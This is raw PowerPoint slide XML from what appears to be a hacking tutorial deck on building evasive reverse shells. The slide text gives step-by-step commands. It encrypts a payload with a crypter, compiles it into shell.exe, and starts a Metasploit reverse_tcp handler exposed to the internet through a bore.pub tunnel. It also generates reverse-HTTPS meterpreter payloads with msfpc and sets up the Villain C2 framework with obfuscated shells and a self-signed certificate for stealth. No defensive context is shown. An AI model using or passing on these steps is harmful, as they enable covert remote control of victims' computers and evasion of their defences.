                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>payload.bin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> shell.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>./</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>crypter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> payload.exe shell.exe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="45E719"/>
              </a:solidFill>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>This generates </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>shell.exe</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4" name="Rectangle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D737292C-7CE7-F871-3537-DCA033A1DCAD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2569029" y="189226"/>
            <a:ext cx="65" cy="709673"/>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85660" rIns="0" bIns="14283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89885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8F304F-7433-1874-A93A-255FD687ED9B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 5: Compile the encrypted payload into an EXE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x86_64-w64-mingw32-gcc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shell.exe.c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -o shell.exe -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>fno</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-stack-protector –s</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 6: Start Metasploit listener</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -q</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>use multi/handler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>set payload windows/x64/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>shell_reverse_tcp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="45E719"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>set LHOST 192.168.1.10</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>set LPORT 4444</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>For WAN use bore </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>yay -S bore # or your favorite AUR helper</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Bore local 8000 --to bore.pub</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>When you start listener in listener use the port 4444</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
              </a:rPr>
              <a:t>set LHOST 127.0.0.1 or 0.0.0.0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>In payload generation you will use the LPORT = bore has given you and the LHOST= bore.pub</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="366073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B6DF86-92C7-E660-159D-BB94DBE0372A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1" y="0"/>
            <a:ext cx="12192001" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="40000"/>
                    <a:lumOff val="60000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Part 4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="40000"/>
                    <a:lumOff val="60000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Use tools like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="40000"/>
                    <a:lumOff val="60000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" kern="100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="40000"/>
                    <a:lumOff val="60000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>-Payload-Creator (MPC)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="40000"/>
                    <a:lumOff val="60000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" kern="100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="40000"/>
                    <a:lumOff val="60000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Villain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4">
                    <a:lumMod val="40000"/>
                    <a:lumOff val="60000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> to create stealthier connections. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Part 4: Using MPC &amp; Villain for Stealthier Connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>MPC (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Payload Creator)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>1. Install MPC: apt install -y </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>msfpc</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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indent="0">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>2. Generate Windows payload with automatic IP: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">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msfpc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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 windows eth0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">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msfpc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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 windows eth0 443 https</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">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msfpc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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 elf eth0 443 https</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0" err="1">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msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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 -q -r /root/windows-meterpreter-staged-reverse-https-443-exe.rc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="373138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71000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="83000">
              <a:schemeClr val="bg1"/>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="bg1"/>
            </a:gs>
          </a:gsLst>
          <a:lin ang="5400000" scaled="1"/>
        </a:gradFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg>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0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Villain C2 Framework</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>7. Install Villain: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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git clone https://github.com/t3l3machus/Villain &amp;&amp; cd Villain &amp;&amp;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0" err="1">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venv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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2400" kern="100" dirty="0" err="1">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venv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> &amp;&amp; source </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>venv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="45E719"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/bin/activate &amp;&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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pip3 install -r requirements.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>8. Start Villain: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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villain -p 6501 -x 8080 -n 4443 -f 8888</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0" err="1">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openssl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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 req -x509 -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0" err="1">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newkey</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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 rsa:4096 -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0" err="1">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keyout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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 key.pem -out cert.pem -days 365 -nodes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>9. Start with HTTPS (stealthier): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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villain -x 443 -c cert.pem -k </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" kern="100" dirty="0" err="1">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key.pem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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OR  python3 Villain.py -x 443 -c cert.pem -k key.pem</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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11. Inside villain run and Generate obfuscated reverse shell: Follow prompt to select obfuscation options</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400"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generate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
